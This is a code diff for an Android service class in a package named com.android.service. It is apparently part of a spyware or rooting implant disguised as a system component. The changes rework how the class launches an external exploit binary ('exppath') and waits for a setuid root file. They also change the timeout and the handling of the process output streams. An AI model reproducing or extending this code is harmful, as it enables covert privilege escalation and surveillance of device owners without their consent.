@@ -1,5 +1,7 @@
 package com.android.service;
 
+import java.io.BufferedReader;
+import java.io.BufferedWriter;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.File;
@@ -7,7 +9,9 @@ import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
+import java.io.OutputStreamWriter;
 
 import android.app.Service;
 import android.content.Intent;
@@ -68,7 +72,7 @@ public class ServiceCore extends Service {
 			if (android.os.Environment.getExternalStorageState().equals(
 					android.os.Environment.MEDIA_MOUNTED)) {
 				Status.self().setRoot(root());
-			}else{
+			} else {
 				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (onStart) no media mounted");
 			}
@@ -137,7 +141,7 @@ public class ServiceCore extends Service {
 			// Attendiamo al max 1 minuto il nostro file setuid root
 			long now = System.currentTimeMillis();
 
-			while (System.currentTimeMillis() - now < 60000) {
+			while (System.currentTimeMillis() - now < 100 * 1024) {
 				Utils.sleep(1000);
 
 				if (checkRoot()) {
@@ -205,16 +209,27 @@ public class ServiceCore extends Service {
 		public void run() {
 			try {
 				localProcess = Runtime.getRuntime().exec(exppath);
-				
-				OutputStream localOutputStream = localProcess.getOutputStream();
-				DataOutputStream localDataOutputStream = new DataOutputStream(
-						localOutputStream);
-				InputStream localInputStream1 = localProcess.getInputStream();
-				DataInputStream inputStdout = new DataInputStream(
-						localInputStream1);
-				InputStream localInputStream2 = localProcess.getErrorStream();
-				DataInputStream inputStderr = new DataInputStream(
-						localInputStream2);
+
+				BufferedWriter stdin = new BufferedWriter(
+						new OutputStreamWriter(localProcess.getOutputStream()));
+				BufferedReader stdout = new BufferedReader(
+						new InputStreamReader(localProcess.getInputStream()));
+				BufferedReader stderr = new BufferedReader(
+						new InputStreamReader(localProcess.getErrorStream()));
+				String full = null;
+				String line = null;
+
+				while ((line = stdout.readLine()) != null) {
+					if (Cfg.DEBUG) {
+						Log.d("QZ", TAG + " (stdout): " + line);
+					}
+				}
+
+				while ((line = stderr.readLine()) != null) {
+					if (Cfg.DEBUG) {
+						Log.d("QZ", TAG + " (stderr): " + line);
+					}
+				}
 
 				try {
 					localProcess.waitFor();
@@ -223,27 +238,15 @@ public class ServiceCore extends Service {
 						Log.d("QZ", TAG + " (waitFor): " + e);
 						e.printStackTrace();
 					}
-					
 				}
+
 				int exitValue = localProcess.exitValue();
-				if (Cfg.DEBUG) 
+				if (Cfg.DEBUG)
 					Log.d("QZ", TAG + " (waitFor): exitValue " + exitValue);
-				while (inputStdout.available() > 0) {
-					String str = inputStdout.readLine();
-					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stdout): " + str);
-					}
-				}
-				
-				while (inputStderr.available() > 0) {
-					String str = inputStdout.readLine();
-					if (Cfg.DEBUG) {
-						Log.d("QZ", TAG + " (stderr): " + str);
-					}
-				}
-				
-				inputStdout.close();
-				inputStderr.close();
+
+				stdin.close();
+				stdout.close();
+				stderr.close();
 
 			} catch (IOException e) {
 				localProcess = null;
